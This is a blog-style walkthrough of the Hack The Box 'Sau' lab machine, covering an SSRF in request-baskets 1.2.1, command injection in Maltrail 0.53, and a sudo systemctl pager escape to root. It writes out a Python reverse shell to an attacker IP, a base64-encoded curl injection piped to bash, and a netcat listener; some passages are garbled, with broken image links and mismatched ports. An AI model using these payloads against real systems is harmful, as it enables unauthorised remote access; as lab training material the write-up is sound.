---
title: Hack The Box - Sau
date: 2023-12-11 13:33:37 +0200
categories:
  - HTB
tags:
  - HTB
comments: true
---

HTB Sau Machine - https://www.hackthebox.com/machines/sau

### Scanning & Enumeration
Scan the machine with Nmap tool
```
sudo nmap -sS -v -n -A 10.10.11.224
```

![](assets/img/posts/pasted-image-20260819231432-png-svg.svg))

Reading further Nmap scan report regarding Port `55555` , we can observe that it is accessible from a browser since it accepts HTTP GET request. Navigate to it
	 http://10.10.11.224:55555

![](assets/img/posts/pasted-image-20260819231641-png-svg.svg))

Now, we know the service running on port 55555 is request-baskets and version of that service is 1.2.1

Upon doing some research on google: `request-baskets version: 1.2.1 github`

You might land up on the fact that this version of request-baskets is vulnerable to SSRF (Server Side Request Forgery)
	https://notes.sjtu.edu.cn/s/MUUhEymt7

Earlier, we have discovered Port 80 being available in the target location but we were not able to access it from outside. I think, we may just have found our way through, with the discovery of request-baskets service.

Our goal becomes here to make use of request-baskets service which is running on Port 55555 to perform a GET request to the Port 80

I'd advise you to play around with the request-baskets to understand what exactly is this service doing. It'll take some time but it will be fine

### Exploitation & Gaining Access
First, let's create a request basket and adjust its settings as following
![](assets/img/posts/20250816233929-png-svg.svg))

1- insecure_tls                    set to true will bypass certificate verification
2- proxy_response              set to true will send response of the forwarded server back to our client
3- expand_path                  set to true makes forward_url path expanded when original http request contains compound path

This app lets users create “baskets” to capture HTTP requests. When I created a new basket, I was given a token, and opening the basket revealed a UI to view incoming requests.

![](/asset`pasted-image-20260819232336.png` Let's find out what lurks inside our Port 80 by visiting our bucket URL
![](/asset`pasted-image-20260819232351.png`entifying the request-baskets version, I searched for known vulnerabilities and found this CVE, This version allowed unauthenticated users to force the server to make HTTP requests to internal services.

Using the exploit from [https://github.com/entr0pie/CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163).

![](/asset`pasted-image-20260819232455.png` the newly created bucket revealed this page, which has a suspiciously obvious version clue for Mailtrail.
![](/asset`pasted-image-20260819232513.png`know the service running on Port 80 is Mailtrail of version 0.53

It is time for you to do some research and see if you can find a vulnerability and if possible prepare a proof-of-concept of this simple vulnerability

Our next vulnerability is that of RCE (Remote Code Execution) which is present in the version 0.53 of Mailtrail service. When search for it in google: Maltrail (v0.53) github
<https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/>

First, we will use netcat and spin-up a listener on our local attack machine.
```
nc -nvlp 9991
```

We will make a python reverse shell payload by: <https://www.revshells.com/>
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.12",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Encode it by: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
```
cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjEyIiw5MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc=
```

Then using the first part of the payload:
```
curl http://10.10.11.224:55555/htb\login -d username=;`echo <payload> |base64 -d|bash`
```

So the final payload will be
```
curl http://10.10.11.224:55555/htb/login -d username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjEyIiw5MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc=|base64 -d|bash`
```

Back to our listener, we will got a shell

### Privilege Escalation
#### Upgrade our Shell
To upgrade the shell, use any of these commands that will work with you
```
Python3 -c 'import pty;pty.spawn("/bin/bash");'
Python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

stty raw -echo;fg
```

Looking for the user flag
```
puma@sau:/home$ cd /home/puma
puma@sau:/home$ cat user.txt
```

What we can run as a sudo without a password
```
puma@sau:/home$ sudo -l
```

We will found:
User puma may run the following commands on sau:
    `(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service`

Googling for it: `exploit /usr/bin/systemctl status trail.service` , we will found
	`sudo /usr/bin/systemctl status trail.service`
	`!sh`
	`!/bin/bash`

So using it to get the root flag
```
puma@sau:/home$ sudo /usr/bin/systemctl status trail.service
puma@sau:/home$ !sh
puma@sau:/home$ !/bin/bash

puma@sau:/home$ cd /root
puma@sau:/home$ cat root.txt
```